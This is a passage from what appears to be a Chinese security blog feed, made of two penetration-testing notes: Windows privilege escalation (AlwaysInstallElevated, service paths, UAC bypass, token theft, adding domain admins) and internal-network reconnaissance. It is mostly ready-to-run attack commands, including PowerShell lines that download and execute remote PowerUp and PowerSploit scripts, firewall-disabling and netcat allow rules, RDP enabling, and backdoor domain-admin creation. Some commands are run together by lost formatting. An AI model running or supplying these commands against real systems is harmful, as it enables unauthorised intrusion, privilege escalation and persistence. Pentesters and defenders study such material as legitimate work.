HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><p>如果值均为 <code>1</code>，说明存在风险</p><ul><li>PowerUp 脚本</li></ul><pre class=" language-powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Get-RegistryAlwaysInstallElevated"</span></code></pre><p>添加账户</p><pre class=" language-powershell"><code class="language-powershell"><span class="token function">Write</span><span class="token operator">-</span>UserAddMSI</code></pre><p>以普通用户运行</p><pre class=" language-cmd"><code class="language-cmd">msiexec /q /i UserAdd.smi</code></pre><p>也可以利用 <code>msf</code> 中的 <code>always_install_elevated</code> 模块</p><h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><h4 id="metasploit-下的利用-1"><a href="#metasploit-下的利用-1" class="headerlink" title="metasploit 下的利用"></a>metasploit 下的利用</h4><ul><li>检测目标机器是否存在漏洞</li></ul><pre class=" language-cmd"><code class="language-cmd">wmic service get name,displayname,pathname,startmode|findstr /i "Auto" | findstr /i /v "C:\Windows\\"|findstr /i /v """</code></pre><ul><li>把要上传的程序重命名并放置在此漏洞且可写的目录下，执行如下命令：</li></ul><pre class=" language-cmd"><code class="language-cmd">sc stop service_namesc start service_name</code></pre><ul><li>也可以使用 msf 中的 <code>Windows Service Trusted Path Privilege Escalation</code> 模块进行测试</li></ul><p><code>注意：</code> msf 要设置 <code>set AutoRunScript migrate -f</code> 防止掉线</p><h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><pre class=" language-cmd"><code class="language-cmd">dir /b /s c:\Unattend.xmldir /b /s c:\sysprep.xml</code></pre><p>查看文件中知否存在 <code>base64</code> 加密的密码</p><p>msf 中集成了该漏洞的利用模块 <code>post/windows/gather/enum_unattend</code></p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><h4 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h4><pre class=" language-cmd"><code class="language-cmd">schtasks /query /fo LIST /v</code></pre><h4 id="查询可写的计划任务文件夹"><a href="#查询可写的计划任务文件夹" class="headerlink" title="查询可写的计划任务文件夹"></a>查询可写的计划任务文件夹</h4><pre class=" language-cmd"><code class="language-cmd">accesschk.exe -dqc "C:\Microsoft" -accepteula</code></pre><h4 id="列出某个驱动器下所有权限配置有缺陷的文件夹"><a href="#列出某个驱动器下所有权限配置有缺陷的文件夹" class="headerlink" title="列出某个驱动器下所有权限配置有缺陷的文件夹"></a>列出某个驱动器下所有权限配置有缺陷的文件夹</h4><pre class=" language-cmd"><code class="language-cmd">accesschk.exe -uwdqsUsersc:\accesschk.exe -uwdqs"AuthenticatedUsers"c:\</code></pre><h4 id="列出某个驱动器下所有权限配置有缺陷的文件"><a href="#列出某个驱动器下所有权限配置有缺陷的文件" class="headerlink" title="列出某个驱动器下所有权限配置有缺陷的文件"></a>列出某个驱动器下所有权限配置有缺陷的文件</h4><pre class=" language-cmd"><code class="language-cmd">accesschk.exe -uwdqsUsersc:\*.*accesschk.exe -uwdqs"AuthenticatedUsers"c:\*.*</code></pre><h3 id="Empire-内置模块"><a href="#Empire-内置模块" class="headerlink" title="Empire 内置模块"></a>Empire 内置模块</h3><pre class=" language-cmd"><code class="language-cmd">usermode privesc/powerup/xxxx</code></pre><h2 id="绕过-UAC-提权"><a href="#绕过-UAC-提权" class="headerlink" title="绕过 UAC 提权"></a>绕过 UAC 提权</h2><h3 id="bypassuac-模块"><a href="#bypassuac-模块" class="headerlink" title="bypassuac 模块"></a>bypassuac 模块</h3><p>前提：当前用户必须在管理员组中</p><pre><code>exploit/windows/local/bypassuacexploit/windows/local/bypassuac_injectgetsystem</code></pre><h3 id="RunAs-模块"><a href="#RunAs-模块" class="headerlink" title="RunAs 模块"></a>RunAs 模块</h3><pre><code>exploit/windows/local/ask</code></pre><p>弹出一个 UAC 框，用户点击后会弹回一个高权限的 shell</p><pre><code>getuid 查看权限，如果是普通用户权限，执行 getsystem 提权</code></pre><h3 id="Nishang-中的-Invoke-PsUACme-模块"><a href="#Nishang-中的-Invoke-PsUACme-模块" class="headerlink" title="Nishang 中的 Invoke-PsUACme 模块"></a>Nishang 中的 Invoke-PsUACme 模块</h3><pre class=" language-cmd"><code class="language-cmd">Invoke-PsUACme -Verbose ## 使用Sysprep方法并执行默认的PayloadInvoke-PsUACme -method oobe -Verbose ## 使用oobe方法方法并执行默认的PayloadInvoke-PsUACme -Payload "powershell -windowstyle hidden -e YourEncodedPayload"## 使用-Payload参数，可以自行指定要执行的Payload</code></pre><h3 id="Empire-中的-bypassuac-模块"><a href="#Empire-中的-bypassuac-模块" class="headerlink" title="Empire 中的 bypassuac 模块"></a>Empire 中的 bypassuac 模块</h3><h4 id="bypassuac-模块-1"><a href="#bypassuac-模块-1" class="headerlink" title="bypassuac 模块"></a>bypassuac 模块</h4><pre class=" language-cmd"><code class="language-cmd">usemode privesc/bypassuac execute</code></pre><h4 id="bypassuac-wscript-模块"><a href="#bypassuac-wscript-模块" class="headerlink" title="bypassuac_wscript 模块"></a>bypassuac_wscript 模块</h4><pre><code>usemode privesc/bypassuac_wscriptexecute</code></pre><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><h3 id="msf-上的令牌窃取"><a href="#msf-上的令牌窃取" class="headerlink" title="msf 上的令牌窃取"></a>msf 上的令牌窃取</h3><p>假设已经获取了 meterpreter shell</p><pre class=" language-cmd"><code class="language-cmd">use incognitolist_tokens -u</code></pre><p>在 <code>incognito</code> 中调用 <code>impersonate_token</code> </p><pre><code>impersonate_token DESKTOP-DUNPKQ9\\Administrator</code></pre><p><code>注意</code>：在输入主机名 <code>\</code> 用户名时，需要输入两个反斜杠</p><h3 id="Rotten-Potato-本地提权"><a href="#Rotten-Potato-本地提权" class="headerlink" title="Rotten Potato 本地提权"></a>Rotten Potato 本地提权</h3><pre><code>use incognitolist_tokens -uexecute -HC -f rottenpotato.exeimpersonate_token "NT AUTHORITY\\SYSTEM"</code></pre><h3 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h3><p>假设网络中设置了域管进程，在 <code>meterpreter shell</code> 中迁移进程至域管进程中</p><pre class=" language-cmd"><code class="language-cmd">net user test test123!@# /ad /domainnet group "domain admins" test /ad /domain</code></pre><p>同样，在 <code>meterpreter shell</code> 中可以使用 <code>incognito</code> 来模拟域管理员，然后通过迭代系统中所有可用的身份验证令牌来添加域管理员。</p><p>在活动的  <code>meterpreter shell</code> 中执行如下命令：</p><pre><code>add_user test test!@#123 -h 1.1.1.2</code></pre><p>执行如下命令，将该账户加到域管理员组中。</p><pre><code>add_user "Domain Admins" test -h 1.1.1.2</code></pre><h3 id="Empire-下的令牌窃取分析"><a href="#Empire-下的令牌窃取分析" class="headerlink" title="Empire 下的令牌窃取分析"></a>Empire 下的令牌窃取分析</h3><p>运行 <code>mimikatz</code>，输入 <code>creds</code> </p><p>执行:</p><pre><code>pth CredID</code></pre><h2 id="无凭证下的权限获取"><a href="#无凭证下的权限获取" class="headerlink" title="无凭证下的权限获取"></a>无凭证下的权限获取</h2><h3 id="LLMNR-和-NetBIOS-欺骗攻击"><a href="#LLMNR-和-NetBIOS-欺骗攻击" class="headerlink" title="LLMNR 和 NetBIOS 欺骗攻击"></a>LLMNR 和 NetBIOS 欺骗攻击</h3><h4 id="Responder-工具"><a href="#Responder-工具" class="headerlink" title="Responder 工具"></a>Responder 工具</h4><p>开启监听模式</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 域环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网信息收集</title>
      <link href="/2020/02/13/nei-wang-xin-xi-shou-ji/"/>
      <url>/2020/02/13/nei-wang-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h2><h3 id="手动信息搜集"><a href="#手动信息搜集" class="headerlink" title="手动信息搜集"></a>手动信息搜集</h3><h4 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h4><pre class=" language-bat"><code class="language-bat">ipconfig /all</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210104114.png-water_print" alt=""></p><h4 id="查询操作系统及软件的信息"><a href="#查询操作系统及软件的信息" class="headerlink" title="查询操作系统及软件的信息"></a>查询操作系统及软件的信息</h4><h5 id="查询操作系统和版本信息"><a href="#查询操作系统和版本信息" class="headerlink" title="查询操作系统和版本信息"></a>查询操作系统和版本信息</h5><pre class=" language-bat"><code class="language-bat">systeminfo | findstr /B /C:"OS Name" /C:"OS Version"systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210104425.png-water_print" alt=""></p><h5 id="查询系统体系结构"><a href="#查询系统体系结构" class="headerlink" title="查询系统体系结构"></a>查询系统体系结构</h5><pre class=" language-bat"><code class="language-bat">echo %PROCESSOR_ARCHITECTURE%</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210104648.png-water_print" alt=""></p><h5 id="查看安装的软件、版本及路径等"><a href="#查看安装的软件、版本及路径等" class="headerlink" title="查看安装的软件、版本及路径等"></a>查看安装的软件、版本及路径等</h5><pre class=" language-bat"><code class="language-bat">wmic product get name, version</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210105032.png-water_print" alt=""></p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token string">"Get-WmiObject -class Win32_Product | select-Object -Property name, version"</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210105022.png-water_print" alt=""></p><h4 id="查询本机服务"><a href="#查询本机服务" class="headerlink" title="查询本机服务"></a>查询本机服务</h4><pre class=" language-bat"><code class="language-bat">wmic service list brief</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210105233.png-water_print" alt=""></p><h4 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h4><pre class=" language-bat"><code class="language-bat">tasklistwmic process list brief</code></pre><h4 id="查看启动程序信息"><a href="#查看启动程序信息" class="headerlink" title="查看启动程序信息"></a>查看启动程序信息</h4><pre class=" language-bat"><code class="language-bat">wmic startup get command, caption</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210105636.png-water_print" alt=""></p><h4 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h4><pre class=" language-cmd"><code class="language-cmd">schtasks /query /fo LIST /v</code></pre><h4 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h4><pre class=" language-cmd"><code class="language-cmd">net statistics workstation</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210110134.png-water_print" alt=""></p><h4 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h4><pre class=" language-cmd"><code class="language-cmd">net usernet localgroup administrators查询在线用户：query user || qwinsta</code></pre><h4 id="列出或断开本地计算机与所连接的客户端之间的会话"><a href="#列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="列出或断开本地计算机与所连接的客户端之间的会话"></a>列出或断开本地计算机与所连接的客户端之间的会话</h4><pre class=" language-cmd"><code class="language-cmd">net session</code></pre><h4 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a>查询端口列表</h4><pre class=" language-cmd"><code class="language-cmd">netstat -ano</code></pre><h4 id="查看补丁列表"><a href="#查看补丁列表" class="headerlink" title="查看补丁列表"></a>查看补丁列表</h4><pre class=" language-cmd"><code class="language-cmd">systeminfo</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210110618.png-water_print" alt=""></p><pre class=" language-cmd"><code class="language-cmd">wmic qfe get Caption,Description,HotfixID,InstalledOn</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210110810.png-water_print" alt=""></p><h4 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a>查询本机共享列表</h4><pre class=" language-cmd"><code class="language-cmd">net sharewmic share get name,path,status</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210110936.png-water_print" alt=""></p><h4 id="查询路由表及所有可用接口的ARP缓存表"><a href="#查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="查询路由表及所有可用接口的ARP缓存表"></a>查询路由表及所有可用接口的ARP缓存表</h4><pre class=" language-cmd"><code class="language-cmd">route printarp -a</code></pre><h4 id="查询防火墙相关配置"><a href="#查询防火墙相关配置" class="headerlink" title="查询防火墙相关配置"></a>查询防火墙相关配置</h4><h5 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h5><p>Windows2003之前版本</p><pre class=" language-cmd"><code class="language-cmd">netsh firewall set opmode disable</code></pre><p>Windows2003之后版本</p><pre class=" language-cmd"><code class="language-cmd">netsh firewall set allprofiles state off</code></pre><h5 id="修改防火墙配置"><a href="#修改防火墙配置" class="headerlink" title="修改防火墙配置"></a>修改防火墙配置</h5><p>Windows2003之前版本</p><pre class=" language-cmd"><code class="language-cmd">netsh firewall add allowedprogram c:\nc.exe "allow nc" enable</code></pre><p>Windows2003之后版本</p><pre class=" language-cmd"><code class="language-cmd">netsh firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe"</code></pre><p>允许指定程序连出</p><pre class=" language-cmd"><code class="language-cmd">netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C:\nc.exe"</code></pre><p>允许3389放行</p><pre class=" language-cmd"><code class="language-cmd">netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow</code></pre><h5 id="自定义防火墙日志的存储位置"><a href="#自定义防火墙日志的存储位置" class="headerlink" title="自定义防火墙日志的存储位置"></a>自定义防火墙日志的存储位置</h5><pre class=" language-cmd"><code class="language-cmd">netsh advfirewall firewall set currentprofile logging filename "C:\windows\temp\fw.log"</code></pre><h4 id="查看代理情况"><a href="#查看代理情况" class="headerlink" title="查看代理情况"></a>查看代理情况</h4><pre class=" language-cmd"><code class="language-cmd">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210113955.png-water_print" alt=""></p><h4 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h4><h5 id="查看远程连接端口"><a href="#查看远程连接端口" class="headerlink" title="查看远程连接端口"></a>查看远程连接端口</h5><pre class=" language-cmd"><code class="language-cmd">reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200210115055.png-water_print" alt=""></p><p>0xd3d转换成10进制为3389</p><h5 id="在Windows-Server2003中开启3389端口"><a href="#在Windows-Server2003中开启3389端口" class="headerlink" title="在Windows Server2003中开启3389端口"></a>在Windows Server2003中开启3389端口</h5><pre class=" language-cmd"><code class="language-cmd">wmic path win32_terminalservicesetting where(__CLASS!="") call setallowtsconnections 1</code></pre><h5 id="在Windows-Server2008和Windows-Server2012中开启3389端口"><a href="#在Windows-Server2008和Windows-Server2012中开启3389端口" class="headerlink" title="在Windows Server2008和Windows Server2012中开启3389端口"></a>在Windows Server2008和Windows Server2012中开启3389端口</h5><pre class=" language-cmd"><code class="language-cmd">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS!="") call setallowsconnections 1wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre><h2 id="自动化收集信息"><a href="#自动化收集信息" class="headerlink" title="自动化收集信息"></a>自动化收集信息</h2><h2 id="Empire下的主机信息搜集"><a href="#Empire下的主机信息搜集" class="headerlink" title="Empire下的主机信息搜集"></a>Empire下的主机信息搜集</h2><h3 id="查看本机用户、域成员、密码设置时间、剪切板内容、系统基本信息、网络适配器信息、共享信息"><a href="#查看本机用户、域成员、密码设置时间、剪切板内容、系统基本信息、网络适配器信息、共享信息" class="headerlink" title="查看本机用户、域成员、密码设置时间、剪切板内容、系统基本信息、网络适配器信息、共享信息"></a>查看本机用户、域成员、密码设置时间、剪切板内容、系统基本信息、网络适配器信息、共享信息</h3><pre class=" language-cmd"><code class="language-cmd">usemodule situational_awareness/host/winenum</code></pre><pre class=" language-cmd"><code class="language-cmd">situational_awareness/host/computerdetails</code></pre><h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h2><h3 id="查询当前权限-1"><a href="#查询当前权限-1" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><pre class=" language-cmd"><code class="language-cmd">whoami</code></pre><p>三种情况：</p><ul><li>本地普通用户</li><li>本地管理员用户</li><li>域内用户</li></ul><h3 id="获取域-SID"><a href="#获取域-SID" class="headerlink" title="获取域 SID"></a>获取域 SID</h3><pre class=" language-cmd"><code class="language-cmd">whoami /all</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200211114616.png-water_print" alt=""></p><h3 id="查询指定用户的详细信息"><a href="#查询指定用户的详细信息" class="headerlink" title="查询指定用户的详细信息"></a>查询指定用户的详细信息</h3><pre class=" language-cmd"><code class="language-cmd">net user XXX /domain</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200211114719.png-water_print" alt=""></p><h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><h3 id="使用-ipconfig-命令"><a href="#使用-ipconfig-命令" class="headerlink" title="使用 ipconfig 命令"></a>使用 ipconfig 命令</h3><pre class=" language-cmd"><code class="language-cmd">ipconfig /all</code></pre><h3 id="查看系统详细信息"><a href="#查看系统详细信息" class="headerlink" title="查看系统详细信息"></a>查看系统详细信息</h3><pre class=" language-cmd"><code class="language-cmd">systeminfo</code></pre><h3 id="查询当前登录域及用户信息"><a href="#查询当前登录域及用户信息" class="headerlink" title="查询当前登录域及用户信息"></a>查询当前登录域及用户信息</h3><pre class=" language-cmd"><code class="language-cmd">net config workstation</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200211114956.png-water_print" alt=""></p><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><pre class=" language-cmd"><code class="language-cmd">net time /domain</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200211115058.png-water_print" alt=""></p><p>执行命令后，存在三种情况：</p><ul><li>存在域：当前不是域用户<ul><li>发生系统错误</li></ul></li><li>存在域：且当前用户是域用户<ul><li>如上图</li></ul></li><li>当前网络环境为工作组<ul><li>找不到域控制器</li></ul></li></ul><h2 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h2><h3 id="利用-NetBIOS-快速探测内网"><a href="#利用-NetBIOS-快速探测内网" class="headerlink" title="利用 NetBIOS 快速探测内网"></a>利用 NetBIOS 快速探测内网</h3><pre class=" language-cmd"><code class="language-cmd">nbtscan.exe 192.168.1.0/20</code></pre><h3 id="利用-ICMP-协议快速探测内网"><a href="#利用-ICMP-协议快速探测内网" class="headerlink" title="利用 ICMP 协议快速探测内网"></a>利用 ICMP 协议快速探测内网</h3><pre class=" language-cmd"><code class="language-cmd">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="</code></pre><h3 id="通过-ARP-扫描探测内网"><a href="#通过-ARP-扫描探测内网" class="headerlink" title="通过 ARP 扫描探测内网"></a>通过 ARP 扫描探测内网</h3><h4 id="arp-scan工具"><a href="#arp-scan工具" class="headerlink" title="arp-scan工具"></a>arp-scan工具</h4><pre class=" language-cmd"><code class="language-cmd">arp.exe -t 192.168.1.0/20</code></pre><h4 id="Empire-中的-ARPscan-模块"><a href="#Empire-中的-ARPscan-模块" class="headerlink" title="Empire 中的 ARPscan 模块"></a>Empire 中的 ARPscan 模块</h4><pre class=" language-cmd"><code class="language-cmd">usemodule situational_awareness/network/arpscan</code></pre><h4 id="Nishang-中的-Invoke-ARPScan-ps1-脚本"><a href="#Nishang-中的-Invoke-ARPScan-ps1-脚本" class="headerlink" title="Nishang 中的 Invoke-ARPScan.ps1 脚本"></a>Nishang 中的 Invoke-ARPScan.ps1 脚本</h4><pre class=" language-cmd"><code class="language-cmd">powershell.exe -exec bypass -Command "&{Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24}" >> C:\Windows\temp\log.txt</code></pre><h3 id="扫描内网端口"><a href="#扫描内网端口" class="headerlink" title="扫描内网端口"></a>扫描内网端口</h3><h4 id="metasploit-端口扫描"><a href="#metasploit-端口扫描" class="headerlink" title="metasploit 端口扫描"></a>metasploit 端口扫描</h4><pre><code>auxiliary/scanner/portscan/tcp</code></pre><h4 id="PowerSploit-的-Invoke-portscan-ps1-脚本"><a href="#PowerSploit-的-Invoke-portscan-ps1-脚本" class="headerlink" title="PowerSploit 的 Invoke-portscan.ps1 脚本"></a>PowerSploit 的 Invoke-portscan.ps1 脚本</h4><pre class=" language-cmd"><code class="language-cmd">powershell.exe -nop -exec bypass -c "IEX (New-ObjectNet.WebClient).DownloadString('https://raw.githubusercontent.com/POwershellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,8080,3389,80' -oA c:\windows\temp\rex.txt"</code></pre><h4 id="Nishang-的-Invoke-PortScan-模块"><a href="#Nishang-的-Invoke-PortScan-模块" class="headerlink" title="Nishang 的 Invoke-PortScan 模块"></a>Nishang 的 Invoke-PortScan 模块</h4><pre class=" language-powershell"><code class="language-powershell">Invoke<span class="token operator">-</span>Portscan <span class="token operator">-</span>StartAddress 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>250<span class="token punctuation">.</span>1 <span class="token operator">-</span>EndAddress 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>250<span class="token punctuation">.</span>255 <span class="token operator">-</span>ResolveHost</code></pre><h4 id="端口-banner-信息"><a href="#端口-banner-信息" class="headerlink" title="端口 banner 信息"></a>端口 banner 信息</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200212095532.png-water_print" alt=""></p><h2 id="收集域内基础信息"><a href="#收集域内基础信息" class="headerlink" title="收集域内基础信息"></a>收集域内基础信息</h2><h3 id="查询域"><a href="#查询域" class="headerlink" title="查询域"></a>查询域</h3><pre class=" language-cmd"><code class="language-cmd">net view /domain</code></pre><h3 id="查询域内所有计算机"><a href="#查询域内所有计算机" class="headerlink" title="查询域内所有计算机"></a>查询域内所有计算机</h3><pre class=" language-cmd"><code class="language-cmd">net view /domain:HACKE</code></pre><h3 id="查询域内所有用户列表"><a href="#查询域内所有用户列表" class="headerlink" title="查询域内所有用户列表"></a>查询域内所有用户列表</h3><pre class=" language-cmd"><code class="language-cmd">net group /domain</code></pre><h3 id="查询域内所有成员计算机列表"><a href="#查询域内所有成员计算机列表" class="headerlink" title="查询域内所有成员计算机列表"></a>查询域内所有成员计算机列表</h3><pre class=" language-cmd"><code class="language-cmd">net group "domain computers" /domain</code></pre><h3 id="查询域密码信息"><a href="#查询域密码信息" class="headerlink" title="查询域密码信息"></a>查询域密码信息</h3><pre class=" language-cmd"><code class="language-cmd">net accounts /domain</code></pre><h3 id="获取域信任信息"><a href="#获取域信任信息" class="headerlink" title="获取域信任信息"></a>获取域信任信息</h3><pre class=" language-cmd"><code class="language-cmd">nltest /domain_trusts</code></pre><h2 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h2><h3 id="查看域控制器的机器名"><a href="#查看域控制器的机器名" class="headerlink" title="查看域控制器的机器名"></a>查看域控制器的机器名</h3><pre class=" language-cmd"><code class="language-cmd">nltest /DCLIST:DomainName</code></pre><h3 id="查看域控制器的主机名"><a href="#查看域控制器的主机名" class="headerlink" title="查看域控制器的主机名"></a>查看域控制器的主机名</h3><pre class=" language-cmd"><code class="language-cmd">nslookup -type=SRV _ldap._tcp.</code></pre><h3 id="查看当前时间"><a href="#查看当前时间" class="headerlink" title="查看当前时间"></a>查看当前时间</h3><pre class=" language-cmd"><code class="language-cmd">net time /domain</code></pre><h3 id="查看域控制器组"><a href="#查看域控制器组" class="headerlink" title="查看域控制器组"></a>查看域控制器组</h3><pre class=" language-cmd"><code class="language-cmd">net group "Domain Controllers" /domain</code></pre><pre class=" language-cmd"><code class="language-cmd">netdom query pdc</code></pre><h2 id="获取域内的用户和管理员信息"><a href="#获取域内的用户和管理员信息" class="headerlink" title="获取域内的用户和管理员信息"></a>获取域内的用户和管理员信息</h2><h3 id="查询所有域用户列表"><a href="#查询所有域用户列表" class="headerlink" title="查询所有域用户列表"></a>查询所有域用户列表</h3><h4 id="向域控服务器进行查询"><a href="#向域控服务器进行查询" class="headerlink" title="向域控服务器进行查询"></a>向域控服务器进行查询</h4><pre class=" language-cmd"><code class="language-cmd">net user /domain</code></pre><h4 id="获取域内用户的详细信息"><a href="#获取域内用户的详细信息" class="headerlink" title="获取域内用户的详细信息"></a>获取域内用户的详细信息</h4><pre class=" language-cmd"><code class="language-cmd">wmic useraccount get /all</code></pre><h4 id="查看存在的用户"><a href="#查看存在的用户" class="headerlink" title="查看存在的用户"></a>查看存在的用户</h4><pre class=" language-cmd"><code class="language-cmd">dsquery user</code></pre><h4 id="查询本地管理员组用户"><a href="#查询本地管理员组用户" class="headerlink" title="查询本地管理员组用户"></a>查询本地管理员组用户</h4><pre class=" language-cmd"><code class="language-cmd">net localgroup administrators</code></pre><h3 id="查询域管理员用户"><a href="#查询域管理员用户" class="headerlink" title="查询域管理员用户"></a>查询域管理员用户</h3><h4 id="查询域管理员用户-1"><a href="#查询域管理员用户-1" class="headerlink" title="查询域管理员用户"></a>查询域管理员用户</h4><pre class=" language-cmd"><code class="language-cmd">net group "domain admins" /domain</code></pre><h4 id="查询管理员用户"><a href="#查询管理员用户" class="headerlink" title="查询管理员用户"></a>查询管理员用户</h4><pre class=" language-cmd"><code class="language-cmd">net group "Enterprise Admins" /domain</code></pre><h2 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h2><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="pslogon-exe"><a href="#pslogon-exe" class="headerlink" title="pslogon.exe"></a>pslogon.exe</h4><pre class=" language-cmd"><code class="language-cmd">pslogon.exe \\DC</code></pre><h4 id="PVEFindADUser-exe"><a href="#PVEFindADUser-exe" class="headerlink" title="PVEFindADUser.exe"></a>PVEFindADUser.exe</h4><pre class=" language-cmd"><code class="language-cmd">PVEFindADUser.exe -current</code></pre><h4 id="netview-exe"><a href="#netview-exe" class="headerlink" title="netview.exe"></a>netview.exe</h4><h4 id="nmap的脚本"><a href="#nmap的脚本" class="headerlink" title="nmap的脚本"></a>nmap的脚本</h4><ul><li>对域控进行信息搜集，可以获取主机信息，用户等信息<ul><li>smb-enum-sessions.nse</li></ul></li><li>获得某台主机的权限，但是无法获取更多的域用户信息<ul><li>Smb-enum-users.nse</li></ul></li><li>遍历远程主机的共享目录<ul><li>smb-enum-shares.nse</li></ul></li><li>对主机远程进程进行遍历<ul><li>smb-enum-process.nse</li></ul></li><li>对主机的操作系统，计算机名，域名，域林名称，NetBIOS机器名，工作组，系统时间等信息<ul><li>smb-os-discovery</li></ul></li></ul><h4 id="powerview脚本"><a href="#powerview脚本" class="headerlink" title="powerview脚本"></a>powerview脚本</h4><ul><li>Invoke-StealthUserHunter</li><li>Invoke-UserHunter</li></ul><h4 id="Empire-的-user-hunter模块"><a href="#Empire-的-user-hunter模块" class="headerlink" title="Empire 的 user_hunter模块"></a>Empire 的 user_hunter模块</h4><pre class=" language-cmd"><code class="language-cmd">usemode situational_awareness/network/powerview/user_hunter</code></pre><h2 id="查找域管进程"><a href="#查找域管进程" class="headerlink" title="查找域管进程"></a>查找域管进程</h2><h3 id="本机检查"><a href="#本机检查" class="headerlink" title="本机检查"></a>本机检查</h3><h4 id="获取域管理员列表"><a 